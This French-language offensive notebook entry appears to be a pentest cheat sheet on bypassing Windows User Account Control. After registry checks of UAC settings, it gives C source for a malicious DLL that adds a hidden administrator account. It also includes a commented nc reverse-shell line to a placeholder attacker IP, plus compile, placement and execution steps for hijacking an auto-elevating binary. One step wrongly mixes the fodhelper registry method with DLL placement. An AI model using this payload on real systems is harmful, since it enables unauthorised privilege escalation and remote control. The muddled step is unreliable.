# 05-Contournement de l'UAC (User Account Control)

L'UAC (User Account Control) est un mécanisme de sécurité qui empêche les modifications non autorisées du système. Le contourner permet d'exécuter des actions avec des privilèges élevés sans invite UAC.

## Vérification des Paramètres UAC
```powershell
# Vérifier si l'UAC est activé
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
# Valeur 1 : Activé, Valeur 0 : Désactivé

# Vérifier le comportement de l'invite pour les administrateurs
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
# Valeurs courantes :
# 0 : Élever sans invite (UAC désactivé pour les admins)
# 1 : Demander les identifiants sur le bureau sécurisé
# 2 : Demander le consentement sur le bureau sécurisé (Défaut)
# 3 : Demander les identifiants
# 4 : Demander le consentement
# 5 : Demander le consentement pour les binaires non-Windows

# Vérifier le niveau de notification UAC (via l'interface graphique ou des outils)
# HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop
```

## Techniques de Contournement UAC
De nombreuses techniques existent, souvent spécifiques à des versions/builds de Windows. Le projet UACME (https://github.com/hfiref0x/UACME) est une référence.

### Exemple de Contournement UAC (DLL Hijacking sur un processus auto-élevé)
Cette technique repose sur le détournement d'une DLL chargée par un processus de confiance qui s'auto-élève sans invite UAC.

**Contexte (Exemple pour Windows 10 build 14393, peut varier)**
Certains exécutables signés par Microsoft dans `C:\Windows\System32` ou `C:\Windows\SysWOW64` s'auto-élèvent. Si l'un d'eux tente de charger une DLL depuis un emplacement contrôlable par l'utilisateur (ou un emplacement où une DLL peut être plantée), cela peut être exploité.

**Étapes générales :**
1.  **Identifier un binaire auto-élevé vulnérable :**
    Utiliser des outils comme Process Monitor pour observer les tentatives de chargement de DLL par des processus qui s'élèvent automatiquement (par exemple, `SystemPropertiesAdvanced.exe`, `eventvwr.exe`, `fodhelper.exe` dans certaines versions). Rechercher les `NAME NOT FOUND` pour les DLL.

2.  **Créer une DLL malveillante :**
    La DLL effectuera les actions privilégiées souhaitées (par exemple, lancer un reverse shell, ajouter un utilisateur admin).
    ```c
    // uac_bypass_dll.c
    #include <windows.h>
    #include <stdlib.h>

    BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
        if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
            system("cmd.exe /c \"net user uacbypass PassW0rd1! /add && net localgroup administrators uacbypass /add\"");
            // Ou lancer un reverse shell
            // system("c:\\temp\\nc.exe <IP_ATTAQUANT> <PORT> -e cmd.exe");
        }
        return TRUE;
    }
    ```
    Compiler (par exemple, `x86_64-w64-mingw32-gcc uac_bypass_dll.c -shared -o target.dll`). Le nom `target.dll` doit correspondre à la DLL que le binaire auto-élevé tente de charger.

3.  **Placer la DLL malveillante :**
    Placer la DLL dans un emplacement où le binaire auto-élevé la chargera. Cela peut être un répertoire spécifique (par exemple, `C:\Windows\System32\Tasks\`, ou un répertoire temporaire si le binaire le recherche là).
    Par exemple, pour certaines techniques avec `fodhelper.exe`, la DLL est placée dans un chemin de registre spécifique sous `HKCU:\Software\Classes\ms-settings\shell\open\command`.

4.  **Exécuter le binaire de confiance :**
    Lancer le binaire qui s'auto-élève et qui est vulnérable au détournement de DLL.
    ```powershell
    # Exemple (conceptuel, dépend de la vulnérabilité spécifique)
    # C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
    # ou
    # fodhelper.exe
    ```

**Outils et Références :**
*   **UACME :** https://github.com/hfiref0x/UACME (Contient de nombreuses méthodes)
*   **Metasploit :** Possède plusieurs modules `exploit/windows/local/bypassuac_*`

**Exemple de commande (conceptuelle, tirée de `03-other-stuff-not-finished.md`) :**
```powershell
# Vérifier la version de Windows
[environment]::OSVersion.Version

# Exemple pour Windows 10 build 14393 (méthode spécifique non détaillée ici)
# 1. Créer une DLL malveillante
# 2. La placer dans un dossier spécifique (ex: WindowsApps, ou via manipulation de registre)
# 3. Exécuter un binaire de confiance qui s'auto-élève et charge la DLL
# C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe # (Ceci est un exemple de binaire, pas une technique complète)
```
Il est crucial de trouver une technique de bypass UAC qui correspond à la version et au niveau de patch de Windows ciblés. Les méthodes changent fréquemment car Microsoft corrige ces failles. 